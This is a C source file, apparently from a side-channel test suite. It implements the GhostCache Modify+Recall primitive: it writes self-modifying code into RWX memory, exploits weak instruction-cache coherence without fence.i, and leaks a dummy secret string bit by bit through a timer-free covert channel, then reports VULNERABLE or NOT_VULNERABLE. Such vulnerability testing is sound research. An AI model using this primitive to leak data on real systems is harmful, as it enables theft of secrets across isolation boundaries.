/**
 * ghostcache: timer-free, counter-free I-cache attack via weak coherence.
 *
 * Faithful implementation of the GhostCache Modify+Recall primitive
 * (Jin et al., CCS 2025): on RISC-V/ARM with weak L1 I/D coherence, a store
 * that modifies a cached code line does NOT invalidate the stale L1I copy
 * (FENCE.I is required).  Whether a subsequent call executes the STALE or the
 * NEW instruction reveals, purely functionally (no timer/counter), whether the
 * L1I line was evicted by a victim.
 *
 *   Call -> Modify -> (victim evicts) -> Recall
 *
 * Part 1 validates the primitive: after Modify (no fence.i) a recall returns
 * the stale value (I$ hit); after evicting the congruent I$ set a recall
 * returns the new value (refetched from D$).  Part 2 builds a multi-bit covert
 * channel: each secret bit is sent by evicting (1) or not (0) the target I$
 * set, and received by observing stale vs new on recall.  The secret string is
 * reconstructed bit-by-bit without any timing measurement.
 */
#include "bench.h"

#if defined(__linux__)
#include <sys/mman.h>
#endif

#ifndef SECURITY_SECRET_LEN
#define SECURITY_SECRET_LEN 8
#endif

#define GC_OLD 0x11
#define GC_NEW 0x22
#define GC_WAYS 4
#define GC_SET_STRIDE 4096 /* L1I index pc[11:6]; 4 KiB keeps the same set */
#define GC_FUNC_BYTES 8    /* li a0,imm ; ret */

static const char secret_str[] = "The Magic Words are Squeamish Ossifrage.";

/* RV64/RV32: addi a0,x0,imm = (imm<<20)|0x513 ; ret = 0x00008067 */
static inline uint32_t gc_li_a0(uint32_t imm) {
  return (imm << 20) | 0x513u;
}
#define GC_RET 0x00008067u

static uint32_t *gc_region;
static size_t gc_region_bytes;

static inline uint32_t *gc_func(int slot) {
  return gc_region + (slot * GC_SET_STRIDE) / 4;
}

static void gc_write_func(int slot, uint32_t val) {
  volatile uint32_t *f = gc_func(slot);
  f[0] = gc_li_a0(val);
  f[1] = GC_RET;
}

static inline int gc_call(int slot) {
  int (*fn)(void) = (int (*)(void))gc_func(slot);
  return fn();
}

/* Evict slot 0's L1I set by calling GC_WAYS congruent functions. */
static void gc_evict_set0(void) {
  for (int w = 1; w <= GC_WAYS; w++)
    gc_call(w);
}

int main(void) {
  if (sc_time_selfcheck("ghostcache") != 0)
    return 1;
#if !defined(__linux__)
  printf("SCRESULT ghostcache SKIP reason=linux-only-mmap\n");
  printf("[ghostcache] SKIP: needs RWX mmap (Linux only)\n");
  return 0;
#else
  gc_region_bytes = (GC_WAYS + 2) * GC_SET_STRIDE;
  gc_region = mmap(NULL, gc_region_bytes, PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (gc_region == MAP_FAILED) {
    printf("SCRESULT ghostcache ERROR reason=mmap\n");
    return 1;
  }

  /* Part 1: validate Modify+Recall (weak coherence + timer-free eviction). */
  gc_write_func(0, GC_OLD);
  for (int w = 1; w <= GC_WAYS; w++)
    gc_write_func(w, 0);
  sc_fence_i();
  gc_call(0);                 /* Call: cache stale OLD in L1I */
  gc_write_func(0, GC_NEW);   /* Modify: D$ now NEW, no fence.i */
  int recall_stale = gc_call(0); /* Recall: stale OLD if weak coherence */
  gc_evict_set0();            /* victim evicts the congruent L1I set */
  int recall_evicted = gc_call(0); /* Recall: NEW if evicted & refetched */

  int weak_coherence = (recall_stale == GC_OLD);
  int eviction_observable = (recall_evicted == GC_NEW);
  printf("[ghostcache] Modify+Recall: recall_stale=0x%02x (want 0x%02x) "
         "recall_evicted=0x%02x (want 0x%02x)\n",
         recall_stale, GC_OLD, recall_evicted, GC_NEW);
  printf("[ghostcache] weak_coherence=%d eviction_observable=%d\n",
         weak_coherence, eviction_observable);

  /* Part 2: multi-bit covert channel.  Each bit: reset stale OLD, modify to
   * NEW, sender evicts (bit=1) or not (bit=0), receiver recalls. */
  uint8_t recovered[SECURITY_SECRET_LEN];
  int matched = 0;
  if (weak_coherence && eviction_observable) {
    for (int i = 0; i < SECURITY_SECRET_LEN; i++) {
      uint8_t byte = 0;
      for (int b = 0; b < 8; b++) {
        int bit = (secret_str[i] >> b) & 1;
        gc_write_func(0, GC_OLD);
        sc_fence_i();
        gc_call(0);              /* stale OLD cached */
        gc_write_func(0, GC_NEW); /* modify, no fence.i */
        if (bit)
          gc_evict_set0();       /* sender: evict => bit 1 */
        int r = gc_call(0);      /* receiver: NEW=1, OLD=0 */
        int rbit = (r == GC_NEW) ? 1 : 0;
        byte |= (uint8_t)(rbit << b);
      }
      recovered[i] = byte;
      matched += (byte == (uint8_t)secret_str[i]);
    }
  }
  int multibit_ok = weak_coherence && eviction_observable &&
                    matched >= (SECURITY_SECRET_LEN + 1) / 2;

  printf("SCRESULT ghostcache %s weak=%d evict_obs=%d rounds=1\n",
         (weak_coherence && eviction_observable) ? "VULNERABLE"
                                                 : "NOT_VULNERABLE",
         weak_coherence, eviction_observable);
  printf("SCRESULT ghostcache-multibit %s leaked=%d/%d rounds=1\n",
         multibit_ok ? "VULNERABLE" : "NOT_VULNERABLE", matched,
         SECURITY_SECRET_LEN);
  printf("[ghostcache] recovered %d/%d bytes: ", matched, SECURITY_SECRET_LEN);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++)
    putchar((recovered[i] > 31 && recovered[i] < 127) ? recovered[i] : '?');
  putchar('\n');
  if (weak_coherence && eviction_observable)
    printf("[ghostcache] VULNERABLE: timer-free I-cache Modify+Recall works\n");
  else
    printf("[ghostcache] NOT VULNERABLE: strong coherence or no eviction "
           "signal\n");
  munmap(gc_region, gc_region_bytes);
  return 0;
#endif
}